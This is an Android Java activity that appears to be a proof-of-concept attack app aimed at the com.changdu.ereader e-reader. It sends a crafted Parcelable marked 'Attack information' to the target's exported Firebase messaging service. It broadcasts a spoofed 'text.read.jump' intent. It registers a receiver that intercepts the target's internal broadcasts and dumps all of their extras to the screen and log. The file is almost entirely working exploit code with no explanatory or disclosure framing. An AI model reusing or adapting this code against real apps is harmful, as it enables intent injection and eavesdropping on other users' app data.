package com.jiayen.broadcast;


import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.databinding.DataBindingUtil;

import android.app.ActivityManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import com.jiayen.broadcast.databinding.ActivityMainBinding;

import org.json.JSONException;
import org.json.JSONObject;

import java.lang.reflect.Field;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * homepage
 */
public class MainActivity extends AppCompatActivity {
    private ActivityMainBinding mainBinding;
    private MyReceiver receiver;

    Map<String, String> map = new HashMap<>();

    private boolean showFlag;

    private int flag = 0;

    Handler handler = new Handler(new Handler.Callback() {
        @Override
        public boolean handleMessage(@NonNull Message msg) {
            showFlag = false;
            return false;
        }
    });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mainBinding = DataBindingUtil.setContentView(this, R.layout.activity_main);


        mainBinding.handService.setOnClickListener(v -> {
            ComponentName chatService = new ComponentName("com.changdu.ereader", "com.google.firebase.messaging.FirebaseMessagingService");
            Intent intent = new Intent();
            intent.setComponent(chatService);
            intent.setAction("com.google.firebase.messaging.NOTIFICATION_OPEN");
            Text tt = new Text();
            tt.setString("Attack information");
            intent.putExtra("pending_intent", tt);
            startService(intent);

        });
        //send broadcast
        mainBinding.sendBroad.setOnClickListener(v -> {
            Intent intent = new Intent("com.changdu.ereader.text.read.jump");
            Text tt = new Text();
            tt.setString("Attack information");
            intent.putExtra("commentReact", tt);
            sendBroadcast(intent);
        });

        mainBinding.startReceiver.setOnClickListener(v -> {

            if (receiver == null) {
                //receive broadcast
                receiver = new MyReceiver();

                IntentFilter filter = new IntentFilter();

                addAction(filter);
                registerReceiver(receiver, filter);
                Toast.makeText(MainActivity.this, "Receiver start success", Toast.LENGTH_SHORT).show();
                mainBinding.startReceiver.setText("Cancle Receiver");
            } else {
                if (receiver != null) {
                    unregisterReceiver(receiver);
                    receiver = null;
                    Toast.makeText(MainActivity.this, "Receiver cancle success", Toast.LENGTH_SHORT).show();
                    mainBinding.startReceiver.setText("Start Receiver");
                }
            }
        });


    }

    private void addAction(IntentFilter filter) {

        filter.addAction("com.changdu.ereader.text.read.jump");
        filter.addAction("com.changdu.hide");
        filter.addAction("com.changdu.ereader.text.read.invalidate");

    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
//        close receiver
        if (receiver != null) {
            unregisterReceiver(receiver);
        }
    }


    public class MyReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            String str = intent.getDataString();
            if (action != null && (action.equals("com.changdu.ereader.text.read.invalidate") || action.equals("com.changdu.hide"))) {
                synchronized (MyReceiver.class) {
                    if (!showFlag) {
                        Toast.makeText(context, "Attack information", Toast.LENGTH_SHORT).show();
                        showFlag = true;
                        flag++;
                    } else {
                        new Thread(() -> {
                            try {
                                Thread.sleep(1000 * 2);
                                handler.sendEmptyMessage(0);
                            } catch (InterruptedException e) {
                                throw new RuntimeException(e);
                            }
                        }).start();
                    }

                }
            }
            if (flag > 10) {
                unregisterReceiver(receiver);
                receiver = null;
                Toast.makeText(MainActivity.this, "Monitored 10 times, cancel the monitor", Toast.LENGTH_SHORT).show();
            }
            Bundle bundle = intent.getExtras();
            JSONObject object = new JSONObject();
            if (bundle != null) {
                if (intent.hasExtra("commentReact")) {
                    Text text = intent.getParcelableExtra("commentReact");
                    map.put(action, text.toString());
                } else {
                    for (String key : bundle.keySet()) {
                        try {
                            object.put(key, bundle.get(key).toString());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                    map.put(action, object.toString());
                }
            } else {
                map.put(action, object.toString());
            }

            android.util.Log.d("MyReceiver", "onReceive: str" + str + "");
//            Toast.makeText(context, action, Toast.LENGTH_LONG).show();
            mainBinding.text.setText(map.toString());
            Log.e("test data", map.toString());
        }
    }

}